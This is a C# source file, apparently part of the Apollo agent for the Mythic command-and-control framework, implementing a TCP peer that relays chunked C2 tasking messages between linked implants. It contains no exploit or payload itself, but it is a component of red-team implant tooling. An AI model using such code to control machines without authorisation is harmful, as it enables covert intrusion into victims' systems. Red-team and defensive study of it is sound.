using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using ApolloInterop.Constants;
using AS = ApolloInterop.Structs.ApolloStructs;
using System.Threading;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using System.Net.Sockets;

namespace Apollo.Peers.TCP
{
    public class TCPPeer : AI.Classes.Peer, ITcpClientCallback
    {
        private AsyncTcpClient _tcpClient = null;
        private TcpClient _client = null;
        private bool _expectEKE;
        private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private MessageType _serverResponseType;
        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port, this);
            _expectEKE = info.C2Profile.Parameters.EncryptedExchangeCheck == "T";

            _sendAction = (object p) =>
            {
                while (((TcpClient)p).Connected)
                {
                    _senderEvent.WaitOne();
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        ((TcpClient)p).GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
            };
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            client.GetStream().EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                client.GetStream().BeginWrite(data, 0, data.Length, OnAsyncMessageSent, client);
            }
        }

        public override bool Connected()
        {
            return _client.Connected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_client.Connected;
        }

        public void OnAsyncConnect(TcpClient client, out object state)
        {
            _client = client;
            _sendTask = new TTasks.Task(_sendAction, client);
            _sendTask.Start();
            _previouslyConnected = true;
            state = this;
        }

        public void OnAsyncDisconnect(TcpClient client, object state)
        {
            client.Close();
            _sendTask.Wait();
        }

        public void OnAsyncMessageReceived(TcpClient client, AS.IPCData data, object state)
        {
            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                Encoding.UTF8.GetString(
                    data.Data.Take(data.DataLength).ToArray()
                )
            );
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new IPCMessageStore(DeserializeToReceiver);
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        public bool DeserializeToReceiver(byte[] data, MessageType mt)
        {
            // Probably where we do sorting based on EKE,
            // checkin, and get_tasking
            switch (mt)
            {
                // part of the checkin process, flag next message to be of EKE
                case MessageType.EKEHandshakeMessage:
                    _serverResponseType = MessageType.EKEHandshakeResponse;
                    break;
                default:
                    _serverResponseType = MessageType.MessageResponse;
                    break;
            }
            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
            {
                UUID = _uuid,
                C2Profile = "tcp",
                Message = Encoding.UTF8.GetString(data)
            });
            return true;
        }

        public override void ProcessMessage(DelegateMessage message)
        {
            _mythicUUID = message.MythicUUID;
            AS.IPCChunkedData[] chunks = _serializer.SerializeDelegateMessage(message.Message, _serverResponseType);
            foreach (AS.IPCChunkedData chunk in chunks)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
            }
            _senderEvent.Set();
        }

        public override bool Start()
        {
            return _tcpClient.Connect();
        }

        public override void Stop()
        {
            _client.Close();
            _sendTask.Wait();
        }
    }
}
